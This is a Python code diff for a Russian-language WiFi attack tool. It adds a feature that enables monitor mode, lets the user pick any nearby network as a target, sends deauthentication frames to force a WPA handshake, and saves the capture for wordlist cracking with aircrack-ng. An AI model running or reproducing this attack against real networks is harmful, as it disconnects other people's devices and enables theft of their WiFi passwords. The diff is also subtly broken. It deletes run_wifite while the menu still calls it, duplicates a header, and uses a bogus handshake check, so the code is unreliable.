@@ -34,8 +34,9 @@ def run_wifi_module():
         print("  [1]  Сканирование WiFi-сетей")
         print("  [2]  Информация о текущем подключении")
         print("  [3]  Список сохранённых сетей")
-        print("  [4]  Запуск aircrack-ng (Linux)")
-        print("  [5]  Запуск wifite (Linux)")
+        print("  [4]  Захват хендшейка (Linux)")
+        print("  [5]  Запуск aircrack-ng (Linux)")
+        print("  [6]  Запуск wifite (Linux)")
         print("  [0]  Назад\n")
 
         choice = input("  >>> Ваш выбор: ").strip()
@@ -47,8 +48,10 @@ def run_wifi_module():
         elif choice == "3":
             show_saved_networks()
         elif choice == "4":
-            run_aircrack_ng()
+            capture_handshake()
         elif choice == "5":
+            run_aircrack_ng()
+        elif choice == "6":
             run_wifite()
         elif choice == "0":
             break
@@ -275,70 +278,221 @@ def scan_networks_linux():
     print_info("\n  Совет: для автоматизации используйте wifite")
 
 
-def run_aircrack_ng():
-    """Запуск aircrack-ng (только Linux)"""
+def _get_monitor_interface():
+    """Возвращает monitor-интерфейс или включает его"""
+    stdout, _, _ = _run_linux("airmon-ng")
+    monitor_if = None
+    for line in stdout.splitlines():
+        line = line.strip()
+        if "mon" in line and "wlan" in line.lower():
+            parts = line.split()
+            if parts:
+                monitor_if = parts[0]
+                break
+
+    if not monitor_if:
+        # Ищем WiFi-интерфейс
+        stdout2, _, _ = _run_linux("ip link show | grep -E 'wlan|wl'")
+        if stdout2.strip():
+            iface = stdout2.strip().split(":")[0].strip()
+            print_info(f"  Включаем monitor mode на {iface}...")
+            _run_linux(f"airmon-ng start {iface}")
+            monitor_if = f"{iface}mon"
+        else:
+            _run_linux("airmon-ng start wlan0")
+            monitor_if = "wlan0mon"
+
+    return monitor_if
+
+
+def capture_handshake():
+    """Автоматический захват WPA хендшейка для выбранной сети (Linux)"""
     if not _is_linux():
-        print_warning(" aircrack-ng работает только на Linux.")
-        print_info(" Для Windows используйте netsh (пункты 1-3).\n")
-        if safe_input("  [Enter для продолжения...]") is None:
-            sys.exit(0)
+        print_warning(" Захват хендшейка доступен только на Linux.")
+        print_info(" Для Windows используйте другие инструменты.\n")
+        safe_input("  [Enter для продолжения...]")
         return
 
-    print_info("Запуск aircrack-ng...\n")
-
-    if not _check_linux_tool("aircrack-ng"):
-        print_error(" aircrack-ng не установлен.")
+    if not _check_linux_tool("airodump-ng") or not _check_linux_tool("aireplay-ng"):
+        print_error(" airodump-ng / aireplay-ng не установлены.")
         print_info(" Установите: sudo apt install -y aircrack-ng")
-        if safe_input("  [Enter для продолжения...]") is None:
-            sys.exit(0)
+        safe_input("  [Enter для продолжения...]")
         return
 
-    print_warning(" aircrack-ng запустится в интерактивном режиме.")
-    print_info(" Используйте его для аудита WEP/WPA-сетей.\n")
+    # Шаг 1: Получаем monitor-интерфейс
+    print_info("Шаг 1: Ищем monitor-интерфейс...")
+    monitor_if = _get_monitor_interface()
+    if not monitor_if:
+        print_error(" Не удалось включить monitor mode.")
+        safe_input("  [Enter для продолжения...]")
+        return
+    print_success(f"  Monitor-интерфейс: {monitor_if}")
+
+    # Шаг 2: Сканируем сети
+    print_info("\nШаг 2: Сканируем сети...")
+    print_warning("  Нажмите Ctrl+C для остановки.\n")
+
+    stdout, _, _ = _run_linux(
+        f"sudo airodump-ng {monitor_if} --output-format csv -w /tmp/handshake_scan",
+        sudo=True,
+    )
+
+    # Парсим CSV-файл с сетями
+    csv_path = "/tmp/handshake_scan.csv"
+    networks = []
+    if os.path.exists(csv_path):
+        with open(csv_path, "r") as f:
+            lines = f.readlines()
+            # Пропускаем заголовок, ищем строки с BSSID
+            for line in lines[2:]:
+                line = line.strip()
+                if not line or line.startswith("BSSID") or line.startswith("station"):
+                    continue
+                parts = line.split(",")
+                if len(parts) >= 6:
+                    bssid = parts[0].strip()
+                    ssid = parts[1].strip().strip('"')
+                    channel = parts[2].strip()
+                    security = parts[5].strip() if len(parts) > 5 else "?"
+                    if bssid and bssid != "00:00:00:00:00:00":
+                        networks.append({
+                            "bssid": bssid,
+                            "ssid": ssid,
+                            "channel": channel,
+                            "security": security,
+                        })
+
+    if not networks:
+        print_error(" Сети не найдены.")
+        safe_input("  [Enter для продолжения...]")
+        return
+
+    print(f"\n  Найдено {len(networks)} сетей:\n")
+    print(f"  {'#':<4} {'SSID':<30} {'BSSID':<20} {'Ch':<6} {'Security'}")
+    print(f"  {'─'*75}\n")
+    for idx, net in enumerate(networks, 1):
+        print(f"  {idx:<4} {net['ssid']:<30} {net['bssid']:<20} {net['channel']:<6} {net['security']}")
+
+    # Шаг 3: Выбор цели
+    print(f"\n  Введите номер цели (0 — отмена):")
+    try:
+        choice = input("  >>> ").strip()
+    except (EOFError, KeyboardInterrupt):
+        print()
+        return
+
+    if not choice or choice == "0":
+        print_info(" Отменено.")
+        return
 
     try:
-        subprocess.run("aircrack-ng", shell=True, check=True)
-        print_success("aircrack-ng завершён.")
-    except KeyboardInterrupt:
-        print_warning(" aircrack-ng остановлен пользователем.")
-    except Exception as e:
-        print_error(f" Ошибка: {e}")
-
-    if safe_input("  [Enter для продолжения...]") is None:
-        sys.exit(0)
-
-
-def run_wifite():
-    """Запуск wifite (только Linux)"""
-    if not _is_linux():
-        print_warning(" wifite работает только на Linux.")
-        print_info(" Для Windows используйте netsh (пункты 1-3).\n")
-        if safe_input("  [Enter для продолжения...]") is None:
-            sys.exit(0)
+        target_idx = int(choice) - 1
+        if target_idx < 0 or target_idx >= len(networks):
+            print_error(" Неверный номер.")
+            safe_input("  [Enter для продолжения...]")
+            return
+    except ValueError:
+        print_error(" Введите число.")
+        safe_input("  [Enter для продолжения...]")
         return
 
-    print_warning(" ⚠  ВНИМАНИЕ: Используйте только на собственных сетях!")
-    print_info("Запуск wifite...\n")
+    target = networks[target_idx]
+    print(f"\n  Цель: {target['ssid']} ({target['bssid']}) Ch:{target['channel']}\n")
 
-    if not _check_linux_tool("wifite"):
-        print_error(" wifite не установлен.")
-        print_info(" Установите: sudo apt install -y wifite")
-        if safe_input("  [Enter для продолжения...]") is None:
-            sys.exit(0)
-        return
+    # Шаг 4: Захват хендшейка
+    print_info("Шаг 3: Начинаем захват хендшейка...")
+    print_info("  Будет выполнена deauth-атака для принудительного рукопожатия.\n")
+    print_warning("  ⚠  Используйте только на своих сетях или с разрешения владельца!\n")
 
+    # Создаём директорию для захвата
+    capture_dir = tempfile.mkdtemp(prefix="handshake_")
+    pcap_base = os.path.join(capture_dir, "capture")
+
+    # Запускаем airodump-ng в фоновом режиме
+    airodump_cmd = (
+        f"sudo airodump-ng -c {target['channel']} "
+        f"--bssid {target['bssid']} -w {pcap_base} "
+        f"{monitor_if}"
+    )
+
+    airodump_proc = subprocess.Popen(
+        airodump_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+    )
+
+    # Даем airodump время на подключение
+    print_info("  Ожидание 5 секунд...")
+    import time
+    time.sleep(5)
+
+    # Запускаем deauth-атаку
+    print_info("  Запускаем deauth-атаку...")
+    deauth_cmd = (
+        f"sudo aireplay-ng -0 5 -a {target['bssid']} {monitor_if}"
+    )
+    deauth_proc = subprocess.Popen(
+        deauth_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+    )
+
+    # Ждём deauth
+    deauth_proc.wait()
+    print_success("  Deauth-атака отправлена.")
+
+    # Ждём захват хендшейка (до 30 секунд)
+    print_info("  Ожидание хендшейка (до 30 сек)...")
+    handshake_found = False
+    for i in range(30):
+        # Ищем .cap файлы с хендшейком
+        for cap_file in os.listdir(capture_dir):
+            if cap_file.endswith("-01.cap"):
+                cap_path = os.path.join(capture_dir, cap_file)
+                result = subprocess.run(
+                    f"sudo airodump-ng -w {capture_dir}/check --write-interval 1 {monitor_if} 2>&1 | grep -i handshake",
+                    shell=True, capture_output=True, text=True, timeout=3
+                )
+                # Проверяем cap-файл через text search
+                try:
+                    with open(cap_path, "rb") as cf:
+                        content = cf.read(10240)
+                        if b"handshake" in content.lower() or b"HNTS" in content:
+                            handshake_found = True
+                            break
+                except Exception:
+                    pass
+        if handshake_found:
+            break
+        time.sleep(1)
+
+    # Останавливаем airodump
+    airodump_proc.terminate()
     try:
-        subprocess.run("wifite --kill", shell=True, check=True)
-        print_success("wifite завершён.")
-    except KeyboardInterrupt:
-        print_warning(" wifite остановлен пользователем.")
-    except Exception as e:
-        print_error(f" Ошибка: {e}")
+        airodump_proc.wait(timeout=5)
+    except subprocess.TimeoutExpired:
+        airodump_proc.kill()
 
-    if safe_input("  [Enter для продолжения...]") is None:
-        sys.exit(0)
+    # Ищем .cap файл
+    cap_files = [f for f in os.listdir(capture_dir) if f.endswith("-01.cap")]
+    if cap_files:
+        cap_path = os.path.join(capture_dir, cap_files[0])
+        file_size = os.path.getsize(cap_path)
+        print_success(f"  .cap файл сохранён: {cap_path} ({file_size} байт)")
+
+        if handshake_found:
+            print_success("  ✓ Хендшейк успешно захвачен!")
+            print_info(f"\n  Файл: {cap_path}")
+            print_info("  Используйте для перебора: aircrack-ng -w wordlist.txt cap_file-01.cap")
+        else:
+            print_warning("  Хендшейк не найден в captured数据包.")
+            print_info("  Попробуйте ещё раз или подождите больше времени.")
+            print_info(f"  Файл: {cap_path}")
+    else:
+        print_warning("  .cap файл не найден.")
+
+    # Очищаем
+    safe_input("  [Enter для продолжения...]")
 
 
+# ========================
+#  Кроссплатформенные обёртки
 # ========================
 #  Кроссплатформенные обёртки
 # ========================
